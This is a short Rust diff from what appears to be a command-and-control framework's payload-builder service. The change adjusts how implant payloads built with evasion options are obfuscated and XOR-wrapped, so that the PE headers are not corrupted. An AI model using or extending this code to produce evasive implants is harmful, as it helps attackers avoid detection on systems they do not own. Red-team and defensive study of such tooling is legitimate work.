@@ -1499,9 +1499,16 @@ impl SpecterService for SpecterGrpcService {
                     .build_with_evasion(fmt, &profile, &server_pubkey, &channels, &sleep_config, kill_date, evasion_flags)
                     .map_err(|e| Status::internal(format!("Build failed: {e}")))?;
 
-                // Apply obfuscation to the payload
-                let payload = if result.payload.len() >= 16 {
-                    crate::builder::obfuscate(&result.payload, &obf_settings)
+                // Obfuscation is applied to the PIC blob BEFORE embedding into PE stubs
+                // (inside PayloadBuilder::build_with_evasion). Do NOT apply it again here
+                // on the full PE, as that would corrupt PE headers and break key derivation.
+                // Only apply XOR encryption (whole-blob wrap) if requested.
+                let payload = if obf_settings.xor_encryption && result.payload.len() >= 16 {
+                    let xor_only = crate::builder::ObfuscationSettings {
+                        xor_encryption: true,
+                        ..Default::default()
+                    };
+                    crate::builder::obfuscate(&result.payload, &xor_only)
                         .unwrap_or(result.payload)
                 } else {
                     result.payload
